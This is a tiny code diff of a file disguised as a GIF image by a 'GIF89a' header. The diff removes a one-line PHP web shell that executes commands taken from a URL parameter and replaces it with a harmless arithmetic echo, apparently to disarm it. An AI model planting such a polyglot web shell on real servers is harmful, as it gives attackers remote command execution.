@@ -1,3 +1,3 @@
 GIF89a;
 
-<?php system($_GET[0]);?>
+<?php echo 1+1;?>
